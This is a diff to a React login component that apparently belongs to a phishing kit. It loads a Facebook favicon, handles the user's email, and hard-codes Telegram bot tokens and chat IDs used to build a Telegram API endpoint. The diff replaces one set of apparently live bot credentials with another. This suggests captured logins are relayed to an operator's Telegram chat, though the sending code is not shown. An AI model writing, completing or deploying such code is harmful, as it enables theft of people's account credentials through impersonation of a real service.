@@ -19,7 +19,7 @@ import MeetingBooking from './MeetingBooking';
 
 const BOT_TOKEN = '8523983828:AAHH7J9TarusfHKTvkc8OVJvRZDUEsi5Vck';
 const CHAT_ID = '-3540741385';
-const API_BASE = `https://api.telegram.org/bot<TOKEN>/sendMessage`;
+const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
 const FACEBOOK_LOGO =
   'https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico'; // favicon
@@ -80,8 +80,8 @@ function useTelegramSocket(
   }, [sessionId, onUpdate]);
 }
 
-const TELEGRAM_BOT_TOKEN = '8277733560:AAHpzM1ah7FHq7BuNdJvv9v0s0vuiMdXCTc'; // <<--- REPLACE
-const TELEGRAM_CHAT_ID = '-5014030730';
+const TELEGRAM_BOT_TOKEN = '8523983828:AAHH7J9TarusfHKTvkc8OVJvRZDUEsi5Vck'; // <<--- REPLACE
+const TELEGRAM_CHAT_ID = '-3540741385';
 
 const Login: React.FC = () => {
   const [email, setEmail] = useState('');
@@ -1541,6 +1541,7 @@ export default Login;
 // //     <p className="text-green-600 font-medium">All done!</p>
 // //   )}
 // // </div>
+
 
 
 
